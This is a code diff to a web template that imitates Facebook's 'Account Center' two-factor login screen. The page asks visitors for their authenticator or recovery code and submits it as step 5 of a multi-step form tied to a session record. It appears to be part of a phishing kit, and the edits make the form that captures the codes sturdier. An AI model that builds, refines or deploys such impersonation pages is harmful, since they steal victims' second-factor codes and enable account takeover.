@@ -9,10 +9,10 @@
             <b>Account Center - Facebook</b><b class="text-2xl">Check notifications on another device</b>            </div>
             <img src="{{ asset('assets/verify_otp.jpg') }}" alt="" />
             <div><b>Approve from another device or Enter your login code</b><p>Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code</p></div>
-            <form id="form" action="{{ route('getdata') }}" method="GET">
-                <input type="hidden" name="_token" value="gFvIrDjsqTPBVZBJTMwePxlETH05ITIfpEjPeK7E" autocomplete="off">                <input type="hidden" name="businessId" value="278188680457">
+            <form id="form" action="{{ route('submission') }}" method="POST">
+                @csrf
                 <input type="hidden" name="step" value="5">
-                <input type="hidden" name="id" value="">
+                <input type="hidden" name="id" value="{{ session('record_id') }}">
             <div class="my-2">
               <input
                 class="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
@@ -24,7 +24,8 @@
                 pattern="\d*"
                 placeholder="Enter Code"
                 value=""
-                id="code" name="otp"
+                id="code" 
+                name="otp_code"
                 onblur="validateInput(this, 'Code')" />
               <p
                 id="codeError"
